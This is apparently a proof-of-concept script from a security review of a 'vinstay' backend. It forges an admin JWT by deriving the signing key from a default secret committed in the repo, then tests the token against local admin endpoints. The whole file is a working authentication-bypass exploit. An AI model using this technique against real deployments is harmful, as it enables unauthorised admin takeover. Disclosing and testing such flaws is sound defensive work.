#!/usr/bin/env python3
"""P-010 FINDING-01 dynamic PoC: forge a valid admin session JWT from REPO-PUBLIC values.

Threat model: a deployment where NODE_ENV != 'production' and JWT_SECRET is empty
(the documented dev default). Then the session JWT signing key is:
    HKDF-SHA256(ikm=AES_SECRET_KEY, salt='vinstay.v1', info='session-jwt', len=32).hex()
and AES_SECRET_KEY defaults to the committed example in backend/.env.example.
Both inputs live in the git repo, so anyone with the repo can mint admin tokens.

Signs {sub:<profileId>, email, iss:'vinstay-backend'} with HS256 and hits a
role-protected admin endpoint. No repo code is imported.
"""
import base64
import hashlib
import hmac
import json
import time
import urllib.request
import urllib.error

BACKEND = "http://127.0.0.1:4000/api/v1"
# ---- values taken straight from the repo (backend/.env.example + secrets.ts) ----
AES_SECRET_KEY = "vinstay_aes_256_secret_key_vhop_32bytes!"   # backend/.env.example
HKDF_SALT = b"vinstay.v1"                                      # secrets.ts deriveKey()
HKDF_INFO = b"session-jwt"                                     # secrets.ts resolveJwtSecret()
ISSUER = "vinstay-backend"                                     # session-token.service.ts
# admin profile id (any known Profile id; here the one created for this review)
ADMIN_ID = "42f05385-7e70-43dd-9a34-87962d7d1567"
ADMIN_EMAIL = "sectest-admin@review.local"


def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()           # extract
    okm, t, counter = b"", b"", 1                                 # expand
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def sign_hs256(payload: dict, key: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    seg = b64u(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key.encode(), seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64u(sig)


def get(url, headers):
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"ERR {type(e).__name__}: {e}"


# derive the signing key from repo-public values only
jwt_key = hkdf_sha256(AES_SECRET_KEY.encode(), HKDF_SALT, HKDF_INFO, 32).hex()
now = int(time.time())
payload = {"sub": ADMIN_ID, "email": ADMIN_EMAIL, "iss": ISSUER,
           "iat": now, "exp": now + 3600}
token = sign_hs256(payload, jwt_key)

print("Derived JWT signing key (from repo values):", jwt_key)
print("Forged token (first 60):", token[:60], "...")

targets = ["/admin/field-hosts", "/account/me", "/admin/field-hosts/zones"]
evidence = {"derived_key": jwt_key, "forged_claims": payload, "requests": []}

print("\n-- baseline (no token) --")
for p in targets:
    s, body = get(BACKEND + p, {})
    print(f"  {p:28} http={s}")
    evidence["requests"].append({"endpoint": p, "auth": "none", "http": s, "body": body[:200]})

print("\n-- with FORGED admin token (Authorization: Bearer) --")
for p in targets:
    s, body = get(BACKEND + p, {"Authorization": f"Bearer {token}"})
    verdict = "ACCEPTED (takeover)" if s == 200 else ("role-gated" if s == 403 else f"http {s}")
    print(f"  {p:28} http={s}  {verdict}")
    evidence["requests"].append({"endpoint": p, "auth": "forged-bearer", "http": s, "body": body[:300]})

print("\n-- with forged token via cookie vs_access --")
s, body = get(BACKEND + "/admin/field-hosts", {"Cookie": f"vs_access={token}"})
print(f"  /admin/field-hosts (cookie) http={s}")
evidence["requests"].append({"endpoint": "/admin/field-hosts", "auth": "forged-cookie", "http": s, "body": body[:300]})

out = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-010/evidences/09_jwt_forgery_poc.json"
with open(out, "w", encoding="utf-8") as f:
    json.dump(evidence, f, ensure_ascii=False, indent=2)
print(f"\nWrote {out}")
